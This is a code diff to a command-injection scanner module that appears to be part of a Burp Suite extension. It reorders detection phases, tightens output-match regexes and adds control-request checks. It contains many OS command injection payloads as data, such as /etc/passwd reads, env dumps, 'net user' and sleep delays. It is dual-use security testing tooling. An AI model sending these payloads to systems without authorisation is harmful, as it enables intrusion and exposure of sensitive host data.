@@ -8,13 +8,14 @@ import burp.api.montoya.http.message.requests.HttpRequest;
 import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
+import com.omnistrike.framework.PayloadEncoder;
+import com.omnistrike.framework.TimingLock;
 
 import com.omnistrike.model.*;
 
-import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
-
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.regex.Pattern;
 
@@ -31,6 +32,8 @@ public class CommandInjectionScanner implements ScanModule {
     private DeduplicationStore dedup;
     private FindingsStore findingsStore;
     private CollaboratorManager collaboratorManager;
+    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
+    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
 
     // Command separators for both Unix and Windows
     private static final String[] UNIX_SEPARATORS = {
@@ -66,8 +69,6 @@ public class CommandInjectionScanner implements ScanModule {
             {";sl${EMPTY}eep SLEEP_SECS;", "sleep-envconcat"},
             // Backtick nesting
             {"$(sleep `echo SLEEP_SECS`)", "sleep-backtick-nest"},
-            // CRLF injection
-            {"%0d%0asleep SLEEP_SECS%0d%0a", "sleep-crlf"},
             // Tab as separator
             {";sleep\tSLEEP_SECS;", "sleep-tab"},
             // Brace expansion
@@ -107,7 +108,7 @@ public class CommandInjectionScanner implements ScanModule {
             {"& waitfor /T SLEEP_SECS omni 2>nul &", "waitfor"},
             // PowerShell sleep variants
             {"& powershell -c \"Start-Sleep SLEEP_SECS\" &", "powershell-c"},
-            {"& powershell -enc BASE64SLEEP &", "powershell-enc"},
+            {"& powershell -c \"Start-Sleep -Seconds SLEEP_SECS\" &", "powershell-enc"},
             // choice command
             {"& choice /C Y /T SLEEP_SECS /D Y >nul &", "choice"},
             // pathping delay
@@ -116,89 +117,81 @@ public class CommandInjectionScanner implements ScanModule {
             {"| cmd /c ping -n SLEEP_SECS 127.0.0.1", "cmd-c-ping"},
     };
 
-    // Error/output-based payloads — look for specific output in response
+    // Error/output-based payloads — require specific command output patterns to confirm execution.
+    // Generic strings like "Linux", "42", "bin", "inet" are NOT used — they appear on normal web pages.
     private static final String[][] OUTPUT_PAYLOADS_UNIX = {
-            {";id;", "uid=", "id command (Unix)"},
-            {"|id|", "uid=", "id command piped (Unix)"},
-            {"$(id)", "uid=", "id via subshell (Unix)"},
-            {"`id`", "uid=", "id via backtick (Unix)"},
-            {";cat /etc/passwd;", "root:", "/etc/passwd read (Unix)"},
-            {"|cat /etc/passwd", "root:", "/etc/passwd piped (Unix)"},
-            {"$(cat /etc/passwd)", "root:", "/etc/passwd subshell (Unix)"},
-            {";uname -a;", "Linux", "uname (Unix)"},
-            {"|uname -a", "Linux", "uname piped (Unix)"},
-            {";echo cmdi_confirmed;", "cmdi_confirmed", "echo marker (Unix)"},
-            {"|echo cmdi_confirmed", "cmdi_confirmed", "echo marker piped (Unix)"},
-            {"$(echo cmdi_confirmed)", "cmdi_confirmed", "echo marker subshell (Unix)"},
+            // id command — uid=\d+ is specific to Unix id output
+            {";id;", "REGEX:uid=\\d+", "id command (Unix)"},
+            {"|id|", "REGEX:uid=\\d+", "id command piped (Unix)"},
+            {"$(id)", "REGEX:uid=\\d+", "id via subshell (Unix)"},
+            {"`id`", "REGEX:uid=\\d+", "id via backtick (Unix)"},
+            // /etc/passwd — root:x:0:0: is definitive
+            {";cat /etc/passwd;", "root:x:0:0:", "/etc/passwd read (Unix)"},
+            {"|cat /etc/passwd", "root:x:0:0:", "/etc/passwd piped (Unix)"},
+            {"$(cat /etc/passwd)", "root:x:0:0:", "/etc/passwd subshell (Unix)"},
+            // uname — require kernel version pattern, not just "Linux"
+            {";uname -a;", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname (Unix)"},
+            {"|uname -a", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname piped (Unix)"},
             // Newline separator
-            {"%0aid%0a", "uid=", "id via newline (Unix)"},
+            {"%0aid%0a", "REGEX:uid=\\d+", "id via newline (Unix)"},
             // $IFS space bypass
-            {";cat${IFS}/etc/passwd;", "root:", "/etc/passwd via IFS (Unix)"},
-            // expr math marker for blind output detection
-            {";expr 41 + 1;", "42", "expr math marker (Unix)"},
-            {"$(expr 41 + 1)", "42", "expr math subshell (Unix)"},
+            {";cat${IFS}/etc/passwd;", "root:x:0:0:", "/etc/passwd via IFS (Unix)"},
+            // expr math marker — unique 6-digit number to avoid matching natural page content
+            {";expr 97531 + 33806;", "131337", "expr math marker (Unix)"},
+            {"$(expr 97531 + 33806)", "131337", "expr math subshell (Unix)"},
             // Backtick nesting with $IFS
-            {"`cat${IFS}/etc/passwd`", "root:", "/etc/passwd via IFS backtick (Unix)"},
-            // whoami
-            {";whoami;", "REGEX:\\w+", "whoami (Unix)"},
-            {"|whoami", "REGEX:\\w+", "whoami piped (Unix)"},
-            {"$(whoami)", "REGEX:\\w+", "whoami subshell (Unix)"},
-            // hostname
-            {";hostname;", "", "hostname (Unix)"},
-            // env/printenv
-            {";env;", "PATH=", "env dump (Unix)"},
-            {";printenv;", "PATH=", "printenv (Unix)"},
-            // ifconfig/ip
-            {";ifconfig 2>/dev/null||ip addr;", "inet", "ifconfig/ip (Unix)"},
-            // ls
-            {";ls /;", "bin", "ls root (Unix)"},
-            {"|ls /", "bin", "ls root piped (Unix)"},
-            // pwd
-            {";pwd;", "/", "pwd (Unix)"},
-            // Perl execution
-            {";perl -e 'print 42';", "42", "perl eval (Unix)"},
-            // Python execution
-            {";python3 -c 'print(42)';", "42", "python3 eval (Unix)"},
-            // Ruby execution
-            {";ruby -e 'puts 42';", "42", "ruby eval (Unix)"},
-            // PHP execution
-            {";php -r 'echo 42;';", "42", "php eval (Unix)"},
-            // cat /proc/version
+            {"`cat${IFS}/etc/passwd`", "root:x:0:0:", "/etc/passwd via IFS backtick (Unix)"},
+            // env/printenv — require PATH with Unix directory structure
+            {";env;", "REGEX:PATH=/(?:usr|bin|sbin)", "env dump (Unix)"},
+            {";printenv;", "REGEX:PATH=/(?:usr|bin|sbin)", "printenv (Unix)"},
+            // ifconfig/ip — require IP address format after inet keyword
+            {";ifconfig 2>/dev/null||ip addr;", "REGEX:inet\\s+\\d+\\.\\d+\\.\\d+\\.\\d+", "ifconfig/ip (Unix)"},
+            // pwd — require a Unix-like path
+            {";pwd;", "REGEX:/(?:home|root|var|tmp|usr|opt|srv|app|www)/", "pwd (Unix)"},
+            // Perl execution — unique marker
+            {";perl -e 'print 131337';", "131337", "perl eval (Unix)"},
+            // Python execution — unique marker
+            {";python3 -c 'print(131337)';", "131337", "python3 eval (Unix)"},
+            // Ruby execution — unique marker
+            {";ruby -e 'puts 131337';", "131337", "ruby eval (Unix)"},
+            // PHP execution — unique marker
+            {";php -r 'echo 131337;';", "131337", "php eval (Unix)"},
+            // ls -la — Unix permission strings (drwxr-xr-x) are unmistakable
+            {";ls -la /;", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / (Unix)"},
+            {"|ls -la /", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / piped (Unix)"},
+            {"$(ls -la /)", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / subshell (Unix)"},
+            {"`ls -la /`", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / backtick (Unix)"},
+            {";ls${IFS}-la${IFS}/;", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / via IFS (Unix)"},
+            {"%0als -la /%0a", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / newline (Unix)"},
+            // cat /proc/version — specific kernel version string
             {";cat /proc/version;", "Linux version", "/proc/version (Unix)"},
             // Curl-based output
-            {"|curl -s file:///etc/passwd", "root:", "curl file proto (Unix)"},
+            {"|curl -s file:///etc/passwd", "root:x:0:0:", "curl file proto (Unix)"},
     };
 
     private static final String[][] OUTPUT_PAYLOADS_WINDOWS = {
-            {"& whoami &", "REGEX:\\w+\\\\\\w+", "whoami (Windows)"},
-            {"| whoami", "REGEX:\\w+\\\\\\w+", "whoami piped (Windows)"},
+            // win.ini — [fonts] section is definitive
             {"& type C:\\Windows\\win.ini &", "[fonts]", "win.ini read (Windows)"},
             {"| type C:\\Windows\\win.ini", "[fonts]", "win.ini piped (Windows)"},
-            {"& echo cmdi_confirmed &", "cmdi_confirmed", "echo marker (Windows)"},
-            {"| echo cmdi_confirmed", "cmdi_confirmed", "echo marker piped (Windows)"},
-            {"& hostname &", "", "hostname (Windows)"},
-            {"& ver &", "Microsoft Windows", "ver command (Windows)"},
-            // set /a math marker
-            {"& set /a 41+1 &", "42", "set /a math marker (Windows)"},
+            // ver — require full version string format
+            {"& ver &", "REGEX:Microsoft Windows \\[Version \\d+\\.", "ver command (Windows)"},
+            // set /a math marker — unique number
+            {"& set /a 97531+33806 &", "131337", "set /a math marker (Windows)"},
             // Newline separator
-            {"%0awhoami%0a", "REGEX:\\w+\\\\\\w+", "whoami via newline (Windows)"},
-            // cmd /c echo
-            {"& cmd /c echo cmdi_confirmed &", "cmdi_confirmed", "cmd /c echo marker (Windows)"},
-            // ipconfig
-            {"& ipconfig &", "IPv4", "ipconfig (Windows)"},
-            // systeminfo
-            {"& systeminfo &", "OS Name", "systeminfo (Windows)"},
-            // dir
-            {"& dir C:\\ &", "Volume", "dir C: (Windows)"},
-            // net user
-            {"& net user &", "Administrator", "net user (Windows)"},
-            // tasklist
-            {"& tasklist &", ".exe", "tasklist (Windows)"},
-            // wmic
-            {"& wmic os get caption &", "Windows", "wmic os (Windows)"},
+            // ipconfig — require IPv4 address pattern
+            {"& ipconfig &", "REGEX:IPv4.*:\\s*\\d+\\.\\d+\\.\\d+\\.\\d+", "ipconfig (Windows)"},
+            // systeminfo — require OS Name with Microsoft
+            {"& systeminfo &", "REGEX:OS Name:\\s+Microsoft", "systeminfo (Windows)"},
+            // dir — require Volume in drive pattern
+            {"& dir C:\\ &", "REGEX:Volume in drive [A-Z]", "dir C: (Windows)"},
+            // net user — require user accounts listing header
+            {"& net user &", "REGEX:User accounts for", "net user (Windows)"},
+            // tasklist — require process.exe with PID pattern
+            {"& tasklist &", "REGEX:\\w+\\.exe\\s+\\d+", "tasklist (Windows)"},
+            // wmic — require Windows with version number
+            {"& wmic os get caption &", "REGEX:Microsoft Windows\\s+(?:Server\\s+)?\\d+", "wmic os (Windows)"},
             // PowerShell expressions
-            {"& powershell -c \"Write-Output cmdi_confirmed\" &", "cmdi_confirmed", "powershell output (Windows)"},
-            {"& powershell -c \"[System.Environment]::OSVersion\" &", "Microsoft", "powershell OSVersion (Windows)"},
+            {"& powershell -c \"[System.Environment]::OSVersion\" &", "REGEX:Microsoft Windows NT \\d+\\.\\d+", "powershell OSVersion (Windows)"},
     };
 
     // OOB payloads using Collaborator (COLLAB_PLACEHOLDER replaced at runtime)
@@ -299,11 +292,25 @@ public class CommandInjectionScanner implements ScanModule {
     }
 
     @Override
+    public List<Finding> processHttpFlowForParameter(
+            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
+        HttpRequest request = requestResponse.request();
+        String urlPath = extractPath(request.url());
+        List<CmdiTarget> targets = extractTargets(request);
+        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
+        return runCmdiTargets(requestResponse, targets, urlPath);
+    }
+
+    @Override
     public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
         HttpRequest request = requestResponse.request();
         String urlPath = extractPath(request.url());
         List<CmdiTarget> targets = extractTargets(request);
+        return runCmdiTargets(requestResponse, targets, urlPath);
+    }
 
+    private List<Finding> runCmdiTargets(HttpRequestResponse requestResponse,
+                                          List<CmdiTarget> targets, String urlPath) {
         for (CmdiTarget target : targets) {
             if (!dedup.markIfNew("cmdi-scanner", urlPath, target.name)) continue;
 
@@ -319,9 +326,16 @@ public class CommandInjectionScanner implements ScanModule {
 
     private void testCommandInjection(HttpRequestResponse original, CmdiTarget target) throws InterruptedException {
         String url = original.request().url();
-        int delaySecs = config.getInt("cmdi.delaySecs", 5);
+        int delaySecs = config.getInt("cmdi.delaySecs", 18);
 
-        // Phase 1: Baseline (multi-measurement for accuracy)
+        // Phase 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
+        if (config.getBool("cmdi.oob.enabled", true)
+                && collaboratorManager != null && collaboratorManager.isAvailable()) {
+            testOob(original, target, url);
+        }
+
+        // Phase 2: Baseline (multi-measurement for accuracy)
+        if (oobConfirmedParams.contains(target.name)) return;
         TimedResult baselineResult = measureResponseTime(original, target, target.originalValue);
         long baselineTime = baselineResult.elapsedMs;
         HttpRequestResponse baseline = baselineResult.response;
@@ -335,89 +349,113 @@ public class CommandInjectionScanner implements ScanModule {
                 b2.response != null ? b2.elapsedMs : 0,
                 b3.response != null ? b3.elapsedMs : 0));
 
-        // Phase 2: Time-based detection (Unix)
-        if (config.getBool("cmdi.unix.enabled", true)) {
-            if (testTimeBased(original, target, url, baselineTime, delaySecs, UNIX_TIME_PAYLOADS, "Unix")) return;
-        }
-
-        // Phase 3: Time-based detection (Windows)
-        if (config.getBool("cmdi.windows.enabled", true)) {
-            if (testTimeBased(original, target, url, baselineTime, delaySecs, WINDOWS_TIME_PAYLOADS, "Windows")) return;
-        }
-
-        // Phase 4: Output-based detection (Unix)
-        if (config.getBool("cmdi.output.enabled", true)) {
+        // Phase 3: Output-based detection (Unix)
+        // Skip output-based for header targets — header injection causes response differences
+        // (WAF blocks, routing changes, logging errors) unrelated to command execution.
+        // Headers are only tested via time-based (below).
+        if (oobConfirmedParams.contains(target.name)) return;
+        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
             if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_UNIX, "Unix")) return;
         }
 
-        // Phase 5: Output-based detection (Windows)
-        if (config.getBool("cmdi.output.enabled", true)) {
+        // Phase 4: Output-based detection (Windows)
+        if (oobConfirmedParams.contains(target.name)) return;
+        if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
             if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_WINDOWS, "Windows")) return;
         }
 
-        // Phase 6: OOB via Collaborator
-        if (config.getBool("cmdi.oob.enabled", true)
-                && collaboratorManager != null && collaboratorManager.isAvailable()) {
-            testOob(original, target, url);
+        // Phase 5: Time-based blind (LAST — serialized via TimingLock)
+        // Gated by global TimingLock.isEnabled() checkbox
+        if (oobConfirmedParams.contains(target.name)) return;
+        if (!TimingLock.isEnabled()) return;
+        try {
+            TimingLock.acquire();
+            if (config.getBool("cmdi.unix.enabled", true)) {
+                if (testTimeBased(original, target, url, baselineTime, delaySecs, UNIX_TIME_PAYLOADS, "Unix")) return;
+            }
+            if (config.getBool("cmdi.windows.enabled", true)) {
+                if (testTimeBased(original, target, url, baselineTime, delaySecs, WINDOWS_TIME_PAYLOADS, "Windows")) return;
+            }
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+            return;
+        } finally {
+            TimingLock.release();
         }
     }
 
     // ==================== TIME-BASED DETECTION ====================
+    // Three-step verification: (1) true condition delays, (2) control/no-op returns within baseline,
+    // (3) true condition delays again. This eliminates FPs from network jitter, WAF blocking, and
+    // server-side load spikes. Mirrors the SQLi time-based verification approach.
 
     private boolean testTimeBased(HttpRequestResponse original, CmdiTarget target, String url,
                                    long baselineTime, int delaySecs, String[][] payloads, String osType)
             throws InterruptedException {
 
-        int thresholdMs = (delaySecs - 1) * 1000; // e.g., 4s threshold for 5s sleep
+        long thresholdMs = (long)(delaySecs * 1000 * 0.8); // 80% of expected delay
 
         for (String[] payloadInfo : payloads) {
             String payloadTemplate = payloadInfo[0];
             String technique = payloadInfo[1];
-            String payload = payloadTemplate.replace("SLEEP_SECS", String.valueOf(delaySecs));
+            String truePayload = payloadTemplate.replace("SLEEP_SECS", String.valueOf(delaySecs));
+            // Control payload: same injection syntax but zero delay — proves the delay is from the command
+            String controlPayload = payloadTemplate.replace("SLEEP_SECS", "0");
 
-
-            TimedResult result1 = measureResponseTime(original, target, target.originalValue + payload);
-
-            if (result1.elapsedMs >= baselineTime + thresholdMs) {
-                // Confirm with second attempt
-
-                TimedResult result2 = measureResponseTime(original, target, target.originalValue + payload);
-
-                if (result2.elapsedMs >= baselineTime + thresholdMs) {
-                    // Double-confirmed
-                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
-                                    "OS Command Injection (Time-Based) - " + osType,
-                                    Severity.CRITICAL, Confidence.FIRM)
-                            .url(url).parameter(target.name)
-                            .evidence("Technique: " + technique + " (" + osType + ")"
-                                    + " | Payload: " + payload
-                                    + " | Baseline: " + baselineTime + "ms"
-                                    + " | Attempt 1: " + result1.elapsedMs + "ms"
-                                    + " | Attempt 2: " + result2.elapsedMs + "ms"
-                                    + " | Expected delay: " + delaySecs + "s")
-                            .description("Time-based OS command injection confirmed (double-tap). "
-                                    + "The server delayed by ~" + delaySecs + " seconds when "
-                                    + technique + " was injected via " + osType + " syntax. "
-                                    + "Parameter '" + target.name + "' is injectable.")
-                            .requestResponse(result2.response)
-                            .build());
-                    return true;
-                } else {
-                    // Single hit — tentative
-                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
-                                    "Potential Command Injection (Time-Based) - " + osType,
-                                    Severity.HIGH, Confidence.TENTATIVE)
-                            .url(url).parameter(target.name)
-                            .evidence("Technique: " + technique + " (" + osType + ")"
-                                    + " | Payload: " + payload
-                                    + " | Single hit: " + result1.elapsedMs + "ms (baseline: " + baselineTime + "ms)")
-                            .description("Single time-delay hit. Could be network latency. "
-                                    + "Retest recommended.")
-                            .requestResponse(result1.response)
-                            .build());
-                }
+            // Step 1: True condition — must delay beyond baseline + 80% of expected
+            TimedResult result1 = measureResponseTime(original, target, target.originalValue + truePayload);
+            if (result1.elapsedMs < baselineTime + thresholdMs) {
+                perHostDelay();
+                continue;
             }
-            perHostDelay();
+            // Discard if response is a small error page (WAF block, not execution)
+            if (isSmallErrorPage(result1.response)) {
+                perHostDelay();
+                continue;
+            }
+
+            // Step 2: Control condition (zero delay) — must return within baseline range
+            // If control also delays, the delay is from network/server load, not command execution
+            TimedResult controlResult = measureResponseTime(original, target, target.originalValue + controlPayload);
+            long controlCeiling = baselineTime + Math.max((long)(baselineTime * 0.5), 1000);
+            if (controlResult.elapsedMs > controlCeiling) {
+                // Control also slow — network jitter or WAF latency, not command injection
+                perHostDelay();
+                continue;
+            }
+
+            // Step 3: True condition again — must delay again to confirm repeatability
+            TimedResult result2 = measureResponseTime(original, target, target.originalValue + truePayload);
+            if (result2.elapsedMs < baselineTime + thresholdMs) {
+                perHostDelay();
+                continue;
+            }
+            if (isSmallErrorPage(result2.response)) {
+                perHostDelay();
+                continue;
+            }
+
+            // All three steps passed — confirmed
+            findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                            "OS Command Injection (Time-Based) - " + osType,
+                            Severity.CRITICAL, Confidence.FIRM)
+                    .url(url).parameter(target.name)
+                    .evidence("Technique: " + technique + " (" + osType + ")"
+                            + " | Payload: " + truePayload
+                            + " | Baseline: " + baselineTime + "ms"
+                            + " | True condition 1: " + result1.elapsedMs + "ms"
+                            + " | Control (zero delay): " + controlResult.elapsedMs + "ms"
+                            + " | True condition 2: " + result2.elapsedMs + "ms"
+                            + " | Expected delay: " + delaySecs + "s (threshold 80%: " + thresholdMs + "ms)")
+                    .description("Time-based OS command injection confirmed via 3-step verification. "
+                            + "True condition delayed by ~" + delaySecs + "s, control (zero delay) returned "
+                            + "within baseline range (" + controlResult.elapsedMs + "ms), second true condition "
+                            + "confirmed the delay. Parameter '" + target.name + "' is injectable via "
+                            + technique + " (" + osType + ").")
+                    .payload(truePayload)
+                    .requestResponse(result2.response)
+                    .build());
+            return true;
         }
         return false;
     }
@@ -437,25 +475,38 @@ public class CommandInjectionScanner implements ScanModule {
             HttpRequestResponse result = sendPayload(original, target, target.originalValue + payload);
             if (result == null || result.response() == null) continue;
 
+            // Skip small error pages — 403/404/500 with body < 500 bytes is never evidence
+            // of command execution (WAF blocks, routing errors, server rejection).
+            // Larger error pages may still contain genuine command output.
+            if (isSmallErrorPage(result)) continue;
+
             String body = result.response().bodyToString();
+            // Empty body is never evidence of command execution
+            if (body == null || body.isEmpty()) continue;
 
             if (!expectedOutput.isEmpty()) {
                 boolean matched;
                 boolean baselineMatched;
+                String matchedEvidence = null; // actual matched text for responseEvidence
 
                 if (expectedOutput.startsWith("REGEX:")) {
-                    // Regex-based matching (e.g., for DOMAIN\User whoami output)
+                    // Regex-based matching (e.g., for echo-wrapped whoami output)
                     Pattern regexPattern = Pattern.compile(expectedOutput.substring(6));
-                    matched = regexPattern.matcher(body).find();
-                    baselineMatched = regexPattern.matcher(baselineBody).find();
+                    java.util.regex.Matcher regexMatcher = regexPattern.matcher(body);
+                    matched = regexMatcher.find();
+                    if (matched) {
+                        matchedEvidence = regexMatcher.group();
+                    }
+                    baselineMatched = !baselineBody.isEmpty() && regexPattern.matcher(baselineBody).find();
                 } else {
                     // Simple string contains matching
                     matched = body.contains(expectedOutput);
-                    baselineMatched = baselineBody.contains(expectedOutput);
+                    matchedEvidence = expectedOutput;
+                    baselineMatched = !baselineBody.isEmpty() && baselineBody.contains(expectedOutput);
                 }
 
                 if (matched && !baselineMatched) {
-                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
+                    Finding.Builder findingBuilder = Finding.builder("cmdi-scanner",
                                     "OS Command Injection (Output-Based) - " + osType,
                                     Severity.CRITICAL, Confidence.CERTAIN)
                             .url(url).parameter(target.name)
@@ -465,8 +516,12 @@ public class CommandInjectionScanner implements ScanModule {
                             .description("Command injection confirmed. Command output matching '"
                                     + expectedOutput + "' found in response via " + technique + ". "
                                     + "Parameter '" + target.name + "' allows OS command execution.")
-                            .requestResponse(result)
-                            .build());
+                            .payload(payload)
+                            .requestResponse(result);
+                    if (matchedEvidence != null) {
+                        findingBuilder.responseEvidence(matchedEvidence);
+                    }
+                    findingsStore.addFinding(findingBuilder.build());
                     return true;
                 }
             }
@@ -499,11 +554,21 @@ public class CommandInjectionScanner implements ScanModule {
 
         // AtomicReference to capture the sent request/response for the finding
         AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+        // AtomicReference to capture the final payload string for the finding
+        AtomicReference<String> sentPayload = new AtomicReference<>();
 
         String collabPayload = collaboratorManager.generatePayload(
                 "cmdi-scanner", url, target.name,
                 "CmdI OOB " + technique,
                 interaction -> {
+                    // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
+                    // fires on a 5-second interval so this race is rare, but when it happens the 50ms
+                    // wait is almost always enough for the sending thread to complete its set() call.
+                    for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    // Mark parameter as confirmed — skip all remaining phases
+                    oobConfirmedParams.add(target.name);
                     findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                     "OS Command Injection (Out-of-Band) - " + osType,
                                     Severity.CRITICAL, Confidence.CERTAIN)
@@ -516,7 +581,8 @@ public class CommandInjectionScanner implements ScanModule {
                                     + "The server executed " + technique + " which triggered a "
                                     + interaction.type().name() + " callback. "
                                     + "Parameter '" + target.name + "' allows arbitrary command execution.")
-                            .requestResponse(sentRequest.get())
+                            .payload(sentPayload.get())
+                            .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
                             .build());
                     api.logging().logToOutput("[CmdI OOB] Confirmed! " + interaction.type()
                             + " interaction for " + url + " param=" + target.name
@@ -528,7 +594,7 @@ public class CommandInjectionScanner implements ScanModule {
 
         String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);
 
-
+        sentPayload.set(payload);
         sentRequest.set(sendPayload(original, target, target.originalValue + payload));
 
         api.logging().logToOutput("[CmdI OOB] Sent " + technique + " payload to " + url
@@ -565,25 +631,36 @@ public class CommandInjectionScanner implements ScanModule {
         return new TimedResult(elapsed, response);
     }
 
+    /**
+     * Returns true if the response is a small error page that should never be treated as
+     * evidence of command execution. 403/404/500 with body under 500 bytes typically indicates
+     * WAF blocking, routing errors, or server rejection — not actual command execution.
+     * Also returns true for null/empty responses.
+     */
+    private boolean isSmallErrorPage(HttpRequestResponse result) {
+        if (result == null || result.response() == null) return true;
+        String body = result.response().bodyToString();
+        if (body == null || body.isEmpty()) return true;
+        int status = result.response().statusCode();
+        return (status == 403 || status == 404 || status == 500) && body.length() < 500;
+    }
+
     private HttpRequest injectPayload(HttpRequest request, CmdiTarget target, String payload) {
         switch (target.type) {
             case QUERY:
                 return request.withUpdatedParameters(
-                        HttpParameter.urlParameter(target.name,
-                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
             case BODY:
                 return request.withUpdatedParameters(
-                        HttpParameter.bodyParameter(target.name,
-                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
             case COOKIE:
-                return request.withUpdatedParameters(
-                        HttpParameter.cookieParameter(target.name, payload));
+                return PayloadEncoder.injectCookie(request, target.name, payload);
             case JSON:
                 String body = request.bodyToString();
                 String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                 if (target.name.contains(".")) {
-                    // Nested key — parse, replace, serialize
-                    String newBody = replaceNestedJsonValue(body, target.name, escaped);
+                    // Nested key — parse, replace, serialize (pass raw payload; Gson escapes internally)
+                    String newBody = replaceNestedJsonValue(body, target.name, payload);
                     return request.withBody(newBody);
                 } else {
                     String pattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
